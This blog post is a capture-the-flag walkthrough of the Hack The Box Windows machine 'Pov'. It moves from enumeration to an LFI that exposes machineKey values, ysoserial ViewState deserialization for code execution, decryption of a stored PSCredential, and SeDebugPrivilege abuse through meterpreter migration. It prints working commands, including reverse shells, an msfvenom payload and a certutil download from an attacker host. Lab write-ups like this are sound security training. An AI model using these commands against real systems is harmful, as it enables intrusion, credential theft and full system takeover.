---
title: "POV"
date: 2024-02-04T13:15:51+01:00
tags: ["web","windows","serialization","wintokens"]
categories: ["hackthebox"]
author: "Ayman Boulaich"
showToc: false
TocOpen: false
draft: false
hidemeta: false
comments: false
summary: "This time we are going to exploit a new seasonal machine called Pov, this is my first competitive machine and the first one which I have done after failing the OSCP exam, being one of the many I want to do before retaking it. In the end the effort will pay off. 😼"
description: "This time we are going to exploit a new seasonal machine called Pov, this is my first competitive machine and the first one which I have done after failing the OSCP exam, being one of the many I want to do before retaking it. In the end the effort will pay off. 😼"
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: true
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: false
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

This time we are going to exploit a new seasonal machine called Pov, this is my first competitive machine and the first one which I have done after failing the OSCP exam, being one of the many I want to do before retaking it. In the end the effort will pay off. 😼

## Room Information

- Room name: Pov
- Difficulty level: Medium
- Room link: https://app.hackthebox.com/machines/pov

![Untitled](/HTB/pov-icon.png)

## Port Scanning

```bash
sudo nmap $IP -p- -n -Pn -vvv --min-rate 5000 -sCV
```

```bash
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: pov.htb
|_http-favicon: Unknown favicon MD5: E9B5E66DEBD9405ED864CAC17E2A888E
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Port enumeration completed, **only a open http port**.

## Enumeration

![Untitled](/HTB/pov-1.png)

The site hasn’t have any url redirection hovering at the buttons.

![Untitled](/HTB/pov-2.png)

At the bottom of the page, we can see a leaked host `dev.pov.htb`, let’s **check** if there are more than one **vhost with ffuf**.

But before we need to update our `/etc/hosts` file.

```bash
##
# Host Database
#
# localhost is used to configure the loopback interface
# when the system is booting.  Do not change this entry.
##
127.0.0.1       localhost
255.255.255.255 broadcasthost
::1             localhost

10.10.11.251    pov.htb
```

```bash
ffuf -u http://10.10.14.150 -H "Host: FUZZ.pov.htb" -w ~/Documents/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc all -o vhost
```

```bash
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.251
 :: Wordlist         : FUZZ: /Users/ayman/Documents/hacking/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.pov.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response words: 3740,1,334
________________________________________________

dev                     [Status: 302, Size: 152, Words: 9, Lines: 2, Duration: 309ms]
```

Only `dev` is outputted.

Before moving to the new page found let’s **fuzz** the current page for **hidden directories**.

```bash
gobuster dir -w ~/Documents/hacking/wordlists/KaliLists/dirb/common.txt -u http://$IP -x php,py,html,js,css,txt,aspx -o gobuster
```

```bash
/css                  (Status: 301) [Size: 147] [--> http://10.10.11.251/css/]
/img                  (Status: 301) [Size: 147] [--> http://10.10.11.251/img/]
/Index.html           (Status: 200) [Size: 12330]
/index.html           (Status: 200) [Size: 12330]
/index.html           (Status: 200) [Size: 12330]
/js                   (Status: 301) [Size: 146] [--> http://10.10.11.251/js/]
```

Nothing useful at this point, now let’s see if we have better luck with the other site.

```bash
gobuster dir -w ~/Documents/hacking/wordlists/KaliLists/dirb/common.txt -u http://dev.pov.htb/portfolio -x php,py,html,js,css,txt,aspx -b 404,302 -o gobuster
```

As the site **default page** is located on **portfolio** I am fuzzing this directory instead of the **root directory** and as **error 404** is redirected with **302** I decided to filter this status code, in order to have a **clear vision** of the output.

```bash
/assets               (Status: 301) [Size: 159] [--> http://dev.pov.htb/portfolio/assets/]
/contact.aspx         (Status: 200) [Size: 4691]
/Contact.aspx         (Status: 200) [Size: 4691]
/default.aspx         (Status: 200) [Size: 21371]
/Default.aspx         (Status: 200) [Size: 21371]
```

## Exploiting

![Untitled](/HTB/pov-3.png)

Checking at `default.aspx`, we can see a button for downloading a CV, that got my attention so I tried to catch the download request.

![Untitled](/HTB/pov-4.png)

I found an **LFI** on the **file prameter** so I tried to read the `web.config` file.

![Untitled](/HTB/pov-5.png)

![Untitled](/HTB/pov-6.png)

After many tries to read the content of `web.config`, I have been able to do it after **changing the file value** to `/web.config` 

One curious thing is the fact that the **POST request** is sending serialized data with `_VIEWSTATE`. 

<aside>
📖 **ViewState** is the method that the ASP.NET framework uses by default to p**reserve page and control values between web pages**

</aside>

After searching info on google, I found a [blog](https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter) which explains that if we have access to the `web.config` and we can modify the value of `_VIEWSTATE` parameter with burp we can achieve **RCE with ysoserial.exe**.

The post gives the exact **ysoserial** command for each **.NET version**, also gives the commands if the server is using **encryption/hashing.**

```bash
<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>
```

As our **.NET version is 4.5** and we have the **decryption key/alg** and **validation key/alg** let’s use the following comand.

```bash
.\ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "COMMAND" --path="/portfolio" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"  --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
```

As the command is using a .**exe binnary** we need a **Windows VM** to execute it.

Now, only rest setting a **nc listener**, execute **ysoserial** with a **powershell rev shell** and sending the ysoserial output in the **_VIEWSTATE value** of the request.

![Untitled](/HTB/pov-7.png)

## Gaining an Initial Foothold

![Untitled](/HTB/pov-8.png)

We entered as `pov\sfitz` , let’s check his current **privileges** and groups

```powershell
whoami /priv
```

```bash
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

```powershell
whoami /groups
```

```bash
GROUP INFORMATION
-----------------

Group Name                             Type             SID                                                           Attributes                                        
====================================== ================ ============================================================= ==================================================
Everyone                               Well-known group S-1-1-0                                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                     Well-known group S-1-5-3                                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1                                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113                                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                      Alias            S-1-5-32-568                                                  Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0                                                       Mandatory group, Enabled by default, Enabled group
IIS APPPOOL\dev                        Well-known group S-1-5-82-781516728-2844361489-696272565-2378874797-2530480757 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```

Nothing seems relevant here.

```powershell
Get-ChildItem -Path /Users -Include * -File -Recurse -ErrorAction SilentlyContinue
```

![Untitled](/HTB/pov-9.png)

Enumerating files on `/Users` folder, shows me a file named **connection.xml**

```powershell
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>
```

alaading **PSCredentials for winRM** exported on a **xml file.**

I have been able to see the **plaintext passwords** with the following commands

```powershell
$credential = Import-CliXml -Path  C:\Users\sfitz\Documents\connection.xml
$credential.GetNetworkCredential().Password
```

## User Pivoting as alaading

Let’s switch the user with **RunasCS.exe**, I used the following command.

```powershell
.\RunasCS.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r 10.10.14.150:5555 --bypass-uac
```

![Untitled](/HTB/pov-10.png)

![Untitled](/HTB/pov-11.png)

As always let’s check the current **privileges.**

```powershell
whoami /priv
```

```powershell
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Awesome, we have **seDebugPrivilege** but it’s appears **disabled** 😭

## Privilege Escalation with seDebugPrivilege

A quick **search on google** gives me the clue of what I need to turn it on. Thanks to an **Hacktricks post** about [Abusing Tokens](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#enable-all-the-tokens) I found a ps1 [module](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) for enabling all the tokens.

Once executed **the privilege still disabled** but we will try to abuse the **seDebugPrivilege** anyway.

One form of abusing this token and the easiest one is by **setting a meterpreter reverse shell** on the current machine and **migrate our current process** to the **winlogon.exe process** with **metasploit.**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.150 LPORT=4446 -f exe > met.exe
```

The above command generates a **meterpreter shell** in a .exe format, we can **download it with certutil.exe**

```powershell
certutil.exe -urlcache -f http://10.10.14.150/met.exe met.exe
```

Once downloaded let’s set the **meterpreter listener** with `exploit/multi/handler` 

```powershell
msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST 10.10.14.150;set LPORT 4446;run;"
```

![Untitled](/HTB/pov-12.png)

We have a **shell** let’s list the **current processes** with `ps`

![Untitled](/HTB/pov-13.png)

**winlogon.exe** has the **uid 556**, let’s use `migrate 556`

![Untitled](/HTB/pov-14.png)

**We have migrated** the current process succesfully.

By creating a **shell**, we can confirm that we are `NT/AUTHORITY SYSTEM` now.

![Untitled](/HTB/pov-15.png)

![Untitled](/HTB/pov-16.png)

**Thank you for reading, and happy hacking! 😄**